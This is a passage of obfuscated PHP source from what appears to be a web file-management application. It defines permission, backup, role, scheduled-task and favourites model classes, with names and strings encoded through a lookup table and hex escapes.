Model($·‹¥àø³[845])->userFileTypeProfile($ŠøÓÑ[$·‹¥àø³[1666]]); } if (isset($ŠøÓÑ[$·‹¥àø³[1864]])) { return Model($·‹¥àø³[845])->groupFileTypeProfile($ŠøÓÑ[$·‹¥àø³[1864]]); } $ù¦ë£Ó¸ = $this->sourceSize(); $éÔÍ¡¼” = array($·‹¥àø³[180] => 0, $·‹¥àø³[178] => 1); $ĞïÔŒ¾ = Model($·‹¥àø³[845])->where($éÔÍ¡¼”)->sum($·‹¥àø³[76]); $éÔÍ¡¼”[$·‹¥àø³[178]] = 2; $ˆ‘ı·àÜ = Model($·‹¥àø³[845])->where($éÔÍ¡¼”)->sum($·‹¥àø³[76]); return array($·‹¥àø³[783] => $ù¦ë£Ó¸[$·‹¥àø³[76]], $·‹¥àø³[1798] => $ù¦ë£Ó¸[$·‹¥àø³[1798]], $·‹¥àø³[1799] => (int) $ĞïÔŒ¾, $·‹¥àø³[1800] => (int) $ˆ‘ı·àÜ); } private function sourceSize() { $¤È—Áùè =& $_SERVER[–Ú¬çÁ]; $óá½«Ç = Model($¤È—Áùè[845])->where(array($¤È—Áùè[462] => 0))->sum($¤È—Áùè[76]); $ãÕ½Ÿ¬­ = Model($¤È—Áùè[521])->sum($¤È—Áùè[76]); if ($ãÕ½Ÿ¬­ > $óá½«Ç) { $ãÕ½Ÿ¬­ = $óá½«Ç; } return array($¤È—Áùè[76] => (int) $óá½«Ç, $¤È—Áùè[1798] => (int) $ãÕ½Ÿ¬­); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¸½ÛÍô =& $_SERVER[–Ú¬çÁ]; $ş˜ú¤Êº = array(array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1865]), $¸½ÛÍô[1866] => $¸½ÛÍô[1867], $¸½ÛÍô[1868] => 1, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1871]), $¸½ÛÍô[1866] => $¸½ÛÍô[1872], $¸½ÛÍô[1868] => 2, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1873]), $¸½ÛÍô[1866] => $¸½ÛÍô[1874], $¸½ÛÍô[1868] => 3, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1875]), $¸½ÛÍô[1866] => $¸½ÛÍô[1876], $¸½ÛÍô[1868] => 4, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_VIEW), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1877]), $¸½ÛÍô[1866] => $¸½ÛÍô[1878], $¸½ÛÍô[1868] => 5, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1879]), $¸½ÛÍô[1866] => $¸½ÛÍô[1880], $¸½ÛÍô[1868] => 6, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¸½ÛÍô[471] => LNG($¸½ÛÍô[1881]), $¸½ÛÍô[1866] => $¸½ÛÍô[1882], $¸½ÛÍô[1868] => 7, $¸½ÛÍô[1869] => 1, $¸½ÛÍô[1870] => 0)); return $ş˜ú¤Êº; } public static function authCheck($İ£áŸÍ€, $¼óë€¾¦) { $áÙñùÔ =& $_SERVER[–Ú¬çÁ]; $İ£áŸÍ€ = intval($İ£áŸÍ€); if ($GLOBALS[$áÙñùÔ[546]] && $GLOBALS[$áÙñùÔ[6]][$áÙñùÔ[1883]]) { return !0; } if ($İ£áŸÍ€ <= 0) { return !1; } if (($İ£áŸÍ€ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($İ£áŸÍ€ & $¼óë€¾¦); } public static function authCheckShow($†»ˆÒ·ƒ) { return self::authCheck($†»ˆÒ·ƒ, self::AUTH_SHOW); } public static function authCheckView($âúÀäÛÉ) { return self::authCheck($âúÀäÛÉ, self::AUTH_VIEW); } public static function authCheckDownload($†Ì¹·ĞÌ) { return self::authCheck($†Ì¹·ĞÌ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($™Ùæ«ò) { return self::authCheck($™Ùæ«ò, self::AUTH_UPLOAD); } public static function authCheckEdit($”Ë é×Ù) { return self::authCheck($”Ë é×Ù, self::AUTH_EDIT); } public static function authCheckRemove($àâ¹©¦á) { return self::authCheck($àâ¹©¦á, self::AUTH_REMOVE); } public static function authCheckShare($Ãİ¾÷Ú¸) { return self::authCheck($Ãİ¾÷Ú¸, self::AUTH_SHARE); } public static function authCheckComment($Áå·Àªè) { return self::authCheck($Áå·Àªè, self::AUTH_COMMENT); } public static function authCheckEvent($Ö§³Ã) { return self::authCheck($Ö§³Ã, self::AUTH_EVENT); } public static function authCheckRoot($• ïÎ¡Ã) { return self::authCheck($• ïÎ¡Ã, self::AUTH_ROOT); } public static function authCheckAction($‘ÓÌşÈ“, $ËÎŞà¨—) { $ééÃ„ =& $_SERVER[–Ú¬çÁ]; $Î³Ò÷¦ = array($ééÃ„[1884] => self::AUTH_VIEW, $ééÃ„[1214] => self::AUTH_DOWNLOAD, $ééÃ„[107] => self::AUTH_UPLOAD, $ééÃ„[1834] => self::AUTH_EDIT, $ééÃ„[1833] => self::AUTH_REMOVE, $ééÃ„[1844] => self::AUTH_SHARE, $ééÃ„[407] => self::AUTH_COMMENT, $ééÃ„[1654] => self::AUTH_EVENT, $ééÃ„[1885] => self::AUTH_ROOT); if (!isset($Î³Ò÷¦[$ËÎŞà¨—])) { return; } $õ»÷¹ô‡ = $Î³Ò÷¦[$ËÎŞà¨—]; $‘ÓÌşÈ“ = intval($‘ÓÌşÈ“); if ($‘ÓÌşÈ“ <= 0) { return !1; } if (($‘ÓÌşÈ“ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‘ÓÌşÈ“ & $õ»÷¹ô‡); } public static function authDisable($Ú™£Œàû, $ãß‘êâÙ) { if (intval($Ú™£Œàû) <= 0) { return 0; } return intval($Ú™£Œàû) & ~$ãß‘êâÙ; } public $optionType = "\123\x79\x73\164\x65\x6d\56\163\x6f\x75\162\x63\145\x41\165\x74\x68\114\151\163\164"; public $field = array("\x6e\x61\155\145", "\x61\x75\x74\x68", "\154\141\x62\x65\154", "\144\151\163\x70\154\141\x79", "\x73\x79\x73\164\x65\x6d", "\163\157\x72\x74"); public function initData() { $©ÇÈŞÖ = $this->authDefault(); foreach ($©ÇÈŞÖ as $²äĞÓŸ) { $this->add($²äĞÓŸ); } } public function findAuth($ Áäş¯, $¯ç™‘˜) { $Ç¬•Ñ¿º =& $_SERVER[–Ú¬çÁ]; $¿Ä‚´ƒ = parent::listData(); foreach ($¿Ä‚´ƒ as $¾¢•ÇÁ¶) { $®Îá“—Û = intval($¾¢•ÇÁ¶[$Ç¬•Ñ¿º[464]]); if ($®Îá“—Û <= 0 || $¾¢•ÇÁ¶[$Ç¬•Ñ¿º[1886]] == 0) { continue; } if (($®Îá“—Û & $ Áäş¯) != $ Áäş¯) { continue; } if (($®Îá“—Û & $¯ç™‘˜) != 0) { continue; } return $¾¢•ÇÁ¶[$Ç¬•Ñ¿º[452]]; } return !1; } public function findAuthReadOnly() { $ Û„î = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $‡ûÖîÉ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ Û„î, $‡ûÖîÉ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $õÑ‘ïÛô =& $_SERVER[–Ú¬çÁ]; $ªªÑÌ¢ = parent::listData(); $ÏĞ–“¯ö = !1; foreach ($ªªÑÌ¢ as $¾íÔŠ×) { if ($¾íÔŠ×[$õÑ‘ïÛô[464]] <= 0 || $¾íÔŠ×[$õÑ‘ïÛô[1886]] == $õÑ‘ïÛô[222]) { continue; } if (!$ÏĞ–“¯ö) { $ÏĞ–“¯ö = $¾íÔŠ×; continue; } if ($ÏĞ–“¯ö[$õÑ‘ïÛô[464]] > $¾íÔŠ×[$õÑ‘ïÛô[464]]) { $ÏĞ–“¯ö = $¾íÔŠ×; } } return $ÏĞ–“¯ö ? $ÏĞ–“¯ö[$õÑ‘ïÛô[452]] : $õÑ‘ïÛô[12]; } public function listData($—ğ¼úêœ = false, $„«€û¨ = "\163\157\x72\164", $ıÛ×œí = false) { return parent::listData($—ğ¼úêœ, $„«€û¨, $ıÛ×œí); } public function update($èü ¢°¸, $µ«¶²Œ) { $®´Ûü” =& $_SERVER[–Ú¬çÁ]; $õäúÖ = parent::listData($èü ¢°¸); $ şµ•¸ƒ = $this->findByName($µ«¶²Œ[$®´Ûü”[32]]); if (!$õäúÖ || $ şµ•¸ƒ && $ şµ•¸ƒ[$®´Ûü”[452]] != $õäúÖ[$®´Ûü”[452]]) { return !1; } $this->filterAuth($µ«¶²Œ[$®´Ûü”[464]]); return parent::update($èü ¢°¸, $µ«¶²Œ); } public function remove($æ¤º—«) { $üùÆ®¼¯ = parent::listData($æ¤º—«); if (!$üùÆ®¼¯ || $üùÆ®¼¯[$_SERVER[–Ú¬çÁ][179]]) { return !1; } return parent::remove($æ¤º—«); } public function add($ùöà‘§µ = array()) { $ï¡–ˆ­Ú =& $_SERVER[–Ú¬çÁ]; if ($this->findByName($ùöà‘§µ[$ï¡–ˆ­Ú[32]])) { return !1; } $ªÇƒğáş = array($ï¡–ˆ­Ú[32] => $ï¡–ˆ­Ú[12], $ï¡–ˆ­Ú[464] => 1, $ï¡–ˆ­Ú[1887] => $ï¡–ˆ­Ú[1874], $ï¡–ˆ­Ú[1886] => 1, $ï¡–ˆ­Ú[179] => 0, $ï¡–ˆ­Ú[1888] => 0); $ùöà‘§µ = array_merge($ªÇƒğáş, $ùöà‘§µ); $ùöà‘§µ[$ï¡–ˆ­Ú[1888]] = $this->getSort(); $this->filterAuth($ùöà‘§µ[$ï¡–ˆ­Ú[464]]); return parent::insert($ùöà‘§µ); } private function getSort() { $Ú½éüù =& $_SERVER[–Ú¬çÁ]; $†’šëçø = parent::listData(); $£†®ÖÕí = array_to_keyvalue($†’šëçø, $Ú½éüù[12], $Ú½éüù[1888]); return empty($£†®ÖÕí) ? 0 : max($£†®ÖÕí) + 1; } private function filterAuth(&$¼Ùúã›İ) { if (!$¼Ùúã›İ) { return; } $Ïî¬Ø¸ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $õ½øÆ»Î = array(); foreach ($Ïî¬Ø¸ as $êæ¾¤Æ) { if ($¼Ùúã›İ & $êæ¾¤Æ) { $õ½øÆ»Î[] = $êæ¾¤Æ; } } if (in_array(self::AUTH_ROOT, $õ½øÆ»Î)) { $¼Ùúã›İ = array_sum($Ïî¬Ø¸); return; } $û”û„Úø = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($õ½øÆ»Î as $êæ¾¤Æ) { if (isset($û”û„Úø[$êæ¾¤Æ])) { $õ½øÆ»Î = array_merge($õ½øÆ»Î, $û”û„Úø[$êæ¾¤Æ]); } } $õ½øÆ»Î[] = self::AUTH_SHOW; $¼Ùúã›İ = array_sum(array_unique($õ½øÆ»Î)); } public function sort($î­çÉî, $»¯™è´) { return parent::update($î­çÉî, $»¯™è´); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x62\x61\143\x6b\165\160\114\x69\163\164"; public $field = array("\151\157", "\156\x61\x6d\145", "\163\164\x61\x74\x75\x73", "\143\x6f\x6e\164\145\x6e\x74", "\155\x61\x6e\x75\x61\x6c", "\162\145\x73\x75\154\164", "\164\151\x6d\145\x46\162\157\x6d", "\164\151\155\145\x54\x6f"); public function config() { $‰™–ëÛ’ =& $_SERVER[–Ú¬çÁ]; $ß’Ä°ò¹ = Model($‰™–ëÛ’[790])->get($‰™–ëÛ’[800]); $ß’Ä°ò¹ = json_decode($ß’Ä°ò¹, !0); $ß’Ä°ò¹ = is_array($ß’Ä°ò¹) ? $ß’Ä°ò¹ : array(); if (!isset($ß’Ä°ò¹[$‰™–ëÛ’[774]])) { $ß’Ä°ò¹[$‰™–ëÛ’[774]] = $‰™–ëÛ’[88]; } unset($ß’Ä°ò¹[$‰™–ëÛ’[1636]]); Action($‰™–ëÛ’[1889])->taskInit(); Model($‰™–ëÛ’[1635])->cacheClear(); $ÜäÈÆŠ = $‰™–ëÛ’[1890]; $ú‰¥âõü = Model($‰™–ëÛ’[1891])->findByKey($‰™–ëÛ’[1654], $ÜäÈÆŠ); if (!$ú‰¥âõü) { $ú‰¥âõü = array(); } if (isset($ú‰¥âõü[$‰™–ëÛ’[194]])) { $ú‰¥âõü[$‰™–ëÛ’[194]] = json_decode($ú‰¥âõü[$‰™–ëÛ’[194]], !0); } if (isset($ß’Ä°ò¹[$‰™–ëÛ’[194]])) { $ú‰¥âõü[$‰™–ëÛ’[194]][$‰™–ëÛ’[1639]] = $ß’Ä°ò¹[$‰™–ëÛ’[194]]; unset($ß’Ä°ò¹[$‰™–ëÛ’[194]]); } return array_merge($ú‰¥âõü, $ß’Ä°ò¹); } public function listData($ÉŒ·ó»· = false, $¨ƒ“ÔÎœ = "\155\x6f\x64\151\x66\x79\x54\x69\155\145", $Æ©İ¤… = false) { return parent::listData($ÉŒ·ó»·, $¨ƒ“ÔÎœ, !0); } public function lastItem() { $˜™Ü€ = $this->listData(); return !empty($˜™Ü€[0]) ? $˜™Ü€[0] : null; } public function kill($÷“ºÂ) { $ˆ÷ÁŸ¡¥ =& $_SERVER[–Ú¬çÁ]; $°ôŸ©ï = $this->listData($÷“ºÂ); if (!$°ôŸ©ï || empty($°ôŸ©ï[$ˆ÷ÁŸ¡¥[32]])) { return !0; } Task::kill($ˆ÷ÁŸ¡¥[799]); Task::kill($ˆ÷ÁŸ¡¥[820]); Task::kill($ˆ÷ÁŸ¡¥[829]); $¾Ÿ¨¶áÉ = $°ôŸ©ï[$ˆ÷ÁŸ¡¥[32]]; $ìîÖñ®² = TEMP_FILES . $ˆ÷ÁŸ¡¥[798] . $¾Ÿ¨¶áÉ . $ˆ÷ÁŸ¡¥[8]; IO::remove($ìîÖñ®², !1); return $this->remove($÷“ºÂ); } public function remove($¾ÕèøıŞ) { $™œş©úÓ = $this->listData($¾ÕèøıŞ); if (!$™œş©úÓ) { return !0; } return $this->backupRemove($™œş©úÓ); } private function backupRemove($Ÿ³à—Û›) { parent::remove($Ÿ³à—Û›[$_SERVER[–Ú¬çÁ][452]]); $°¹ÁÀ±¨ = $this->backupPath($Ÿ³à—Û›); IO::remove($°¹ÁÀ±¨, !1); return !0; } private function backupPath($ŒòÔÁ³•) { $æÉŠê³ö =& $_SERVER[–Ú¬çÁ]; $†ëÑ‡Ô = $ŒòÔÁ³•[$æÉŠê³ö[32]]; $¡¨›ŸÁ = Model($æÉŠê³ö[790])->get($æÉŠê³ö[791]); $„ø·É™ = substr(md5($æÉŠê³ö[792] . $¡¨›ŸÁ . $†ëÑ‡Ô), 0, 8); return "\173\151\157\72{$ŒòÔÁ³•[$æÉŠê³ö[771]]}\x7d\57\x64\x61\164\x61\x62\x61\x73\145\x2f\142\141\x63\153\x75\160\x2f" . $†ëÑ‡Ô . $æÉŠê³ö[11] . $„ø·É™; } public function start() { $«ÜĞØ‰§ =& $_SERVER[–Ú¬çÁ]; if ($GLOBALS[$«ÜĞØ‰§[6]][$«ÜĞØ‰§[89]][$«ÜĞØ‰§[1892]] != $«ÜĞØ‰§[88]) { return !0; } $ã½´ˆŞÆ = $this->config(); if (!$ã½´ˆŞÆ || $ã½´ˆŞÆ[$«ÜĞØ‰§[1636]] != $«ÜĞØ‰§[88]) { return !1; } $€Ùá¥ã´ = $this->process(); foreach ($€Ùá¥ã´ as $¡¶Ëû›¹) { if ($¡¶Ëû›¹) { return Task::restart($¡¶Ëû›¹[$«ÜĞØ‰§[452]]); } } $¶¤ÄÖÃ = new Backup(); $Ò¹§¤½– = $¶¤ÄÖÃ->db(); if ($Ò¹§¤½–) { $Ò¹§¤½– = $¶¤ÄÖÃ->dbFile(); if ($Ò¹§¤½– && $ã½´ˆŞÆ[$«ÜĞØ‰§[774]] == $«ÜĞØ‰§[222]) { $Ò¹§¤½– = $¶¤ÄÖÃ->file(); } } Backup::set(array($«ÜĞØ‰§[770] => 1, $«ÜĞØ‰§[781] => time())); return !0; } public function process() { $Õù†ëÛœ =& $_SERVER[–Ú¬çÁ]; $êÓ¡“ô› = array($Õù†ëÛœ[777] => Task::get($Õù†ëÛœ[799]), $Õù†ëÛœ[782] => Task::get($Õù†ëÛœ[820]), $Õù†ëÛœ[224] => Task::get($Õù†ëÛœ[829])); $ÉåíÛˆ© = !1; foreach ($êÓ¡“ô› as &$½ã•ıå·) { if ($ÉåíÛˆ©) { $½ã•ıå· = !1; continue; } if ($½ã•ıå·) { $Á»³úçş = intval(_get($½ã•ıå·, $Õù†ëÛœ[1671], 0)); if (time() - $Á»³úçş > 7200) { Task::kill($½ã•ıå·[$Õù†ëÛœ[452]]); $ÉåíÛˆ© = !0; $½ã•ıå· = !1; } } } return $êÓ¡“ô›; } public function restore() { $üŞÎ =& $_SERVER[–Ú¬çÁ]; ActionCall($üŞÎ[1080], !0, 1); ActionCall($üŞÎ[1080], !0, 0); } } goto EÄ‰Ï¯±Æ˜; DÛ„ğ­áÕ¦: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\162\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\150", "\x6c\141\x62\145\x6c", "\144\x69\163\160\x6c\x61\171", "\x73\171\x73\164\x65\155", "\x64\x65\x73\143", "\151\x67\156\x6f\162\145\x45\x78\164", "\151\147\156\x6f\162\145\x46\151\x6c\145\x53\151\x7a\x65", "\x61\144\x6d\151\156\x69\163\x74\162\141\164\x6f\x72", "\x73\157\162\164"); public function listData($±õ¶Û½æ = false, $ˆºœ¸‰º = "\163\x6f\162\164", $×Ö‚ïŞ§ = false) { $Ä—ŞÑ·¿ =& $_SERVER[–Ú¬çÁ]; $ÍÛ·×Ò = parent::listData($±õ¶Û½æ, $ˆºœ¸‰º, $×Ö‚ïŞ§); if (!$±õ¶Û½æ) { foreach ($ÍÛ·×Ò as $ÁúÉ†•Ÿ => $’âÌ×‚ø) { if ($’âÌ×‚ø[$Ä—ŞÑ·¿[2066]] == 1) { $ÍÛ·×Ò[$ÁúÉ†•Ÿ][$Ä—ŞÑ·¿[503]] = LNG($Ä—ŞÑ·¿[2305]); } } } return $ÍÛ·×Ò; } public function update($ç¨ï‡¤À, $Â¢½ş¹©) { $ÓõÌŠÒ =& $_SERVER[–Ú¬çÁ]; $‰´½“ï† = parent::listData($ç¨ï‡¤À); $—Ã…€Ó‰ = $this->findByName($Â¢½ş¹©[$ÓõÌŠÒ[32]]); if (!$‰´½“ï† || $—Ã…€Ó‰ && $—Ã…€Ó‰[$ÓõÌŠÒ[452]] != $‰´½“ï†[$ÓõÌŠÒ[452]]) { return !1; } if ($—Ã…€Ó‰[$ÓõÌŠÒ[2066]] == 1) { $Â¢½ş¹© = array($ÓõÌŠÒ[32] => $Â¢½ş¹©[$ÓõÌŠÒ[32]], $ÓõÌŠÒ[1887] => $Â¢½ş¹©[$ÓõÌŠÒ[1887]]); } $this->filterAuth($Â¢½ş¹©[$ÓõÌŠÒ[464]]); return parent::update($ç¨ï‡¤À, $Â¢½ş¹©); } public function remove($°á£²­Ï) { $÷Ö’ÉÛú = parent::listData($°á£²­Ï); if (!$÷Ö’ÉÛú || $÷Ö’ÉÛú[$_SERVER[–Ú¬çÁ][179]]) { return !1; } return parent::remove($°á£²­Ï); } public function add($‰® Úš) { $ˆøÙß÷ß =& $_SERVER[–Ú¬çÁ]; $äËİñ£ = $‰® Úš[$ˆøÙß÷ß[32]]; if ($this->findByName($äËİñ£)) { return !1; } $¢ ’”Ú„ = array($ˆøÙß÷ß[471] => $äËİñ£, $ˆøÙß÷ß[1870] => $ˆøÙß÷ß[12], $ˆøÙß÷ß[1866] => $ˆøÙß÷ß[1874], $ˆøÙß÷ß[2306] => 1, $ˆøÙß÷ß[1869] => 0, $ˆøÙß÷ß[2307] => 0, $ˆøÙß÷ß[1868] => $this->getSort()); $‰® Úš = array_merge($¢ ’”Ú„, $‰® Úš); $this->filterAuth($‰® Úš[$ˆøÙß÷ß[464]]); return parent::insert($‰® Úš); } private function getSort() { $…†ÁÑ¦ø =& $_SERVER[–Ú¬çÁ]; $ØøõœğÜ = parent::listData(); $™‡‡„ÑÛ = array_to_keyvalue($ØøõœğÜ, $…†ÁÑ¦ø[12], $…†ÁÑ¦ø[1888]); return empty($™‡‡„ÑÛ) ? 0 : max($™‡‡„ÑÛ) + 1; } private function filterAuth(&$»Í×¨èõ) { $Ö×ò¢ˆ› =& $_SERVER[–Ú¬çÁ]; $÷ßŞß³Û = array(); $éÜİÔõù = array_filter(explode($Ö×ò¢ˆ›[50], $»Í×¨èõ)); foreach ($éÜİÔõù as $»Í×¨èõ) { $éÚğ·¶İ = explode($Ö×ò¢ˆ›[10], $»Í×¨èõ); if ($éÚğ·¶İ[0] == $Ö×ò¢ˆ›[2308] && $éÚğ·¶İ[1] != $Ö×ò¢ˆ›[1210]) { $ÀÄÒßâ = $éÚğ·¶İ[0] . $Ö×ò¢ˆ›[10] . $éÚğ·¶İ[1] . $Ö×ò¢ˆ›[2309]; if (!in_array($ÀÄÒßâ, $éÜİÔõù)) { $÷ßŞß³Û[] = $ÀÄÒßâ; } } $÷ßŞß³Û[] = $»Í×¨èõ; } $»Í×¨èõ = implode($Ö×ò¢ˆ›[50], $÷ßŞß³Û); } public function findRoleDefault() { $ò¢Óî™È =& $_SERVER[–Ú¬çÁ]; $ú“Ç°Ë = parent::listData(); $œÔç’ğÓ = !1; foreach ($ú“Ç°Ë as $¢éÄ¢à·) { if (!$¢éÄ¢à· || $¢éÄ¢à·[$ò¢Óî™È[1886]] == $ò¢Óî™È[222] || $¢éÄ¢à·[$ò¢Óî™È[2066]] == 1) { continue; } if (strstr($¢éÄ¢à·[$ò¢Óî™È[464]], $ò¢Óî™È[2310])) { continue; } if (!strstr($¢éÄ¢à·[$ò¢Óî™È[464]], $ò¢Óî™È[2311])) { continue; } if (!$œÔç’ğÓ) { $œÔç’ğÓ = $¢éÄ¢à·; continue; } $ñğê·ÃÊ = explode($ò¢Óî™È[50], $œÔç’ğÓ[$ò¢Óî™È[464]]); $ê¯à‘½˜ = explode($ò¢Óî™È[50], $¢éÄ¢à·[$ò¢Óî™È[464]]); if (count($ñğê·ÃÊ) > count($ê¯à‘½˜)) { $œÔç’ğÓ = $¢éÄ¢à·; } } return $œÔç’ğÓ ? $œÔç’ğÓ[$ò¢Óî™È[452]] : $ò¢Óî™È[12]; } public function sort($ğ¶«õ•í, $İ¹¿ìÍÜ) { return parent::update($ğ¶«õ•í, $İ¹¿ìÍÜ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x74\x61\163\153\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\164\171\160\145", "\145\x76\x65\x6e\164", "\164\x69\x6d\x65", "\x64\x65\x73\x63", "\x73\171\x73\164\145\155", "\x65\x6e\141\x62\154\145", "\154\x61\163\x74\x52\165\156", "\x73\x6f\162\x74"); public function listData($á½¦Óô = false, $É£„ç¹ = "\163\157\162\x74", $æ†ÁËƒœ = false) { return parent::listData($á½¦Óô, $É£„ç¹, $æ†ÁËƒœ); } public function add($ó¹…«Æ„) { $Ÿ‘€úûº =& $_SERVER[–Ú¬çÁ]; $Ù˜†õïÕ = $this->findByName($ó¹…«Æ„[$Ÿ‘€úûº[32]]); if ($Ù˜†õïÕ) { return !1; } $ó¹…«Æ„[$Ÿ‘€úûº[1623]] = 0; $ó¹…«Æ„[$Ÿ‘€úûº[1888]] = $this->getSort(); return parent::insert($ó¹…«Æ„); } private function getSort() { $ƒ» Ôôä =& $_SERVER[–Ú¬çÁ]; $¹´Á¤” = parent::listData(); $ßÄ˜öÉÍ = array_to_keyvalue($¹´Á¤”, $ƒ» Ôôä[12], $ƒ» Ôôä[1888]); return empty($ßÄ˜öÉÍ) ? 0 : max($ßÄ˜öÉÍ) + 1; } public function update($ åë’è¡, $ñÂ±¡¦¢) { $ÍÎµ“Ğâ =& $_SERVER[–Ú¬çÁ]; $‹‘º­·× = $this->listData($ åë’è¡); $şëè›Ë = $this->findByName($ñÂ±¡¦¢[$ÍÎµ“Ğâ[32]]); if (!$‹‘º­·× || $şëè›Ë && $şëè›Ë[$ÍÎµ“Ğâ[452]] != $‹‘º­·×[$ÍÎµ“Ğâ[452]]) { return !1; } return parent::update($ åë’è¡, $ñÂ±¡¦¢); } public function remove($ÄÀœ“ñ…, $Í„ï²½­ = false) { $À¯·ûùí =& $_SERVER[–Ú¬çÁ]; $Ëıß““¨ = $this->listData($ÄÀœ“ñ…); if (!$Ëıß““¨) { return; } if (!$Í„ï²½­ && $Ëıß““¨[$À¯·ûùí[179]] == $À¯·ûùí[88]) { return !1; } return parent::remove($ÄÀœ“ñ…); } public function enable($óÀ²ÆÅë, $‡ÑãçÂÜ) { return $this->update($óÀ²ÆÅë, array($_SERVER[–Ú¬çÁ][2300] => $‡ÑãçÂÜ)); } public function run($ş¿ó¬İ¬) { return $this->update($ş¿ó¬İ¬, array($_SERVER[–Ú¬çÁ][2312] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($÷…±¿Âó) { $ó•â¦Ÿ­ =& $_SERVER[–Ú¬çÁ]; return array($ó•â¦Ÿ­[1975] => array(USER_ID, $ó•â¦Ÿ­[2313])); } protected function listData() { $ö§ ‘™ =& $_SERVER[–Ú¬çÁ]; $–øìÅ”² = array($ö§ ‘™[1657] => USER_ID, $ö§ ‘™[535] => 0); $¢’Ãè„Ü = $ö§ ‘™[2314]; $Èöõ Èš = $this->field($¢’Ãè„Ü)->where($–øìÅ”²)->order($ö§ ‘™[2315])->select(); return $Èöõ Èš ? $Èöõ Èš : array(); } protected function resetCache() { } protected function listView() { $ŞÁ­øîä =& $_SERVER[–Ú¬çÁ]; $ÍÄ®Ş¤× = $this->listData(); $Şô‘Æ­î = array_filter_by_field($ÍÄ®Ş¤×, $ŞÁ­øîä[33], $ŞÁ­øîä[467]); $„×á¾Í½ = array_to_keyvalue($Şô‘Æ­î, $ŞÁ­øîä[12], $ŞÁ­øîä[84]); if (!$„×á¾Í½) { return $ÍÄ®Ş¤×; } $Ô“‹Ñ = 2000; $»×ü™µí = array($ŞÁ­øîä[468] => array($ŞÁ­øîä[469], $„×á¾Í½)); $øÑïİ—Ğ = Model($ŞÁ­øîä[845])->listSource($»×ü™µí, $Ô“‹Ñ); $øÑïİ—Ğ = array_merge($øÑïİ—Ğ[$ŞÁ­øîä[83]], $øÑïİ—Ğ[$ŞÁ­øîä[82]]); $øÑïİ—Ğ = array_to_keyvalue($øÑïİ—Ğ, $ŞÁ­øîä[181]); foreach ($ÍÄ®Ş¤× as $‰÷í¶É => $æ¼®Óµ) { $­ñŞöš = $øÑïİ—Ğ[$æ¼®Óµ[$ŞÁ­øîä[84]]]; $­ñŞöš = $­ñŞöš ? $­ñŞöš : array(); $ÍÄ®Ş¤×[$‰÷í¶É] = array_merge($­ñŞöš, $æ¼®Óµ); } return $ÍÄ®Ş¤×; } protected function addFav($È®Û£ƒ, $Ö’ãóÜğ = '', $êê¦³¹ƒ = "\x73\157\165\x72\x63\x65") { $Ù¾ŞĞÍ÷ =& $_SERVER[–Ú¬çÁ]; $ºİú§ÁŠ = array($Ù¾ŞĞÍ÷[1657] => USER_ID, $Ù¾ŞĞÍ÷[535] => 0, $Ù¾ŞĞÍ÷[473] => 